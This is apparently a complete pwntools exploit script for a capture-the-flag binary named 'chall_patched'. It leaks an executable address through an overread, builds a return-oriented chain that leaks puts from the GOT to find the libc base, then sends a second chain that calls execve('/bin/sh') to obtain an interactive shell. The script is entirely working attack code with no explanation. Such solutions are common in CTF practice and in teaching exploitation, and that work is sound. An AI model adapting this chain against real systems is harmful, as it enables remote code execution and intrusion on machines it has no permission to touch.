#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*reg+262

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
sla(b"choice: ", b"3")
sla(b"[y/n] ", b"n")
sla(b"[y/n] ", b"y")
sla(b"[y/n] ", b"y")
sla(b"[y/n] ", b"y")
sl(b"y")
sla(b"choice: ", b"4")
sa(b"Name: ", b"a")
sa(b"address: ", b"a"*44)
sla(b"choice: ", b"2")
p.recvuntil(b"a" * 44)
exe_leak = u64(p.recv(6) + b'\0\0')
info("exe lesk: " + hex(exe_leak))
exe.address = exe_leak - 5010
info("exe base: " + hex(exe.address))

pop_rdi = exe.address + 0x00000000000018c3

sla(b"choice: ", b"1")
sa(b"username: ", b"a")
sla(b"age: ", b"123")

payload = b"a" * 56
payload += p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
sla(b"address: ", payload)

libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))
pop_rbp = libc.address + 0x00000000000213e3
pop_rsi = libc.address + 0x0000000000023a6a
pop_rdx = libc.address + 0x0000000000001b96
pop_rax = libc.address + 0x000000000001b500

sla(b"choice: ", b"1")
sa(b"username: ", b"a")
sla(b"age: ", b"123")
payload = b"b" * 56
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(libc.address + 0x0000000000002743)
sla(b"address: ", payload)

p.interactive()
